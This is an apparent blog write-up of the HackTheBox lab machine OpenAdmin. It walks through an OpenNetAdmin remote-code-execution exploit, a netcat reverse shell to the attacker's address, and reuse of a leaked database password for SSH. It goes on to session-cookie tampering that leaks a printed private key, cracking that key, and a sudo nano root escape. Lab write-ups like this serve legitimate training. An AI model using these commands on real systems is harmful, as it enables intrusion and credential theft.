---
title: "OpenAdmin HTB"
date: 2020-01-06T20:55:28-05:00
draft: true
---

OpenAdmin is an "Easy" machine on HackTheBox. I say easy because this box will certainly be challenging for a beginner, but it is a good learning experience.

## Host Information:
IP: 10.10.10.171
Hostname: openadmin 
External Ports: 22, 80

## Summary:

OpenNetAdmin application on port 80 under /ona/login.php is vulnerable to a publically available RCE. Exploitation permits she'll access as the www-data user. Credential reuse vulnerability between the mysql database permits for secure shell access over port 22 as the jimmy user. The jimmy user is able to access a local webserver that can be accessed via portforwarding, exposing the web application to session cookie tampering. This cookie tampering leaks the secure shell private key of the joanna user. Authenticating as the joanna user over SSH allows for privilege escalation via sudo nano. 

## Attack Path
================

**Service Enumeration**

nmap --open -p- -v -n 10.10.10.171 | tee nnap-open-ports

Clicking through the various web applications, eventually allows us to navigate to /music -> login revealing an administrative portal at /ona. 
```bash
searchsploit opennetadmin
searchsploit -m 47772
```

**Initial Foothold**
```bash
chmod +x 47772.sh
./47772.sh http://10.10.10.171/ona/login.php
$ mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.2 443 1>/tmp/backpipe
```
**www-data Enumeration**  

whoami
www-data

cat /opt/ona/.gitignore  
cd www/local  
cd config  
cat database_settings.inc.php  

These database settings expose the password for the jimmy ona_sys service account for the mysql db. The password is reused by the jimmy user, which makes ssh easy for us. 

```bash
(www-data) exit
root@kali # ssh jimmy@10.10.10.171
pw: n1nj4W4rri0R!
```
**jimmy Enumeration**  

$ cd /var/www/internal  

$ cat main.php

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Take particular note of the if conditional in main.php, if SESSION('username'), and the originating header is set to /index.php, the shell_exec will print joanna's private key, major data leak here. Let's see if we can exploit it by using a proxy like Burp Suite. 

First, reviewing the index.php file reveals a hardcoded username that gets passed to main.php, this username is jimmy. Judging from the input in SESSION['username'], this value is either passed in as a parameter, or a cookie. Since the PHP code says SESSION, I assumed it was the latter. 

```php
<h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
```

Before we can fire up Burp suite and MitM the HTTP traffic, we setup a reverse proxy since the web application is only accessible locally on the host. We execute the SSH port forward command on our own kali host. 

netstat -ano
exit

```bash
ssh -L 9000:localhost:52846 jimmy@10.10.10.171
```
We can now setup Burp to capture our requests on port 8080 (which our firefox is configured to send all requests through), and pass the output of Burp to port 9000. 

Firing up burp we can issue a fake login with user:jimmy, password:anythingToTest 

We see the following request come through to Burp, confirming that a session cookie is set that we can manipulate client-side.  

> **Captured Request**  
POST /index.php HTTP/1.1  
Host: 127.0.0.1:8080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 46  
Origin: http://127.0.0.1:8080  
Connection: close  
Referer: http://127.0.0.1:8080/  
Cookie: PHPSESSID=u27j0fuduqcnmmi3nh52m0esko  
Upgrade-Insecure-Requests: 1  
username=jimmy&password=n1nj4W4rri0R%21&login=  

> **Editing the request to change the endpoint and provide our tampered session cookie:**  

GET /main.php HTTP/1.1  
Host: 127.0.0.1:8080  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Cookie: PHPSESSID=jimmy  
Upgrade-Insecure-Requests: 1  

> **This leaks the following private key (encrypted):**  

<sub><sup>  
-----BEGIN RSA PRIVATE KEY-----  
Proc-Type: 4,ENCRYPTED  
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D  

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN  
-----END RSA PRIVATE KEY-----  
</sub></sup>

Decrypting this is possible with ssh2john.py and then john. ssh2john.py converts the private key into a format consumable by john. 

```bash
ssh2john.py encryptedKey > johnCapableKey; john johnCapablekey --wordlist=rockyou.txt
```

This reveals a password of bloodninjas which is used to encrypt the private key. We can now generate the decrypted private key with:

```bash
$ oopenssl rsa -in encryptedKey -out decryptedKey
$ password: bloodninjas
```

…and authenticate with:
> $ ssh -i decryptedKey joanna@10.10.10.171 

As joanna we can $ sudo -l to see that we can run nano as root. This means we have root access via a nano command execution. The relevant gtfobin article is here:
> https://gtfobins.github.io/gtfobins/nano/  

Opening nano as sudo we can then perform:
```bash
^R^X
Reset; sh 1>&0 2>&0
```
Where ^R^X is ctrl+R and ctrl+X.

These commands prompt a shell inside the nano terminal. 



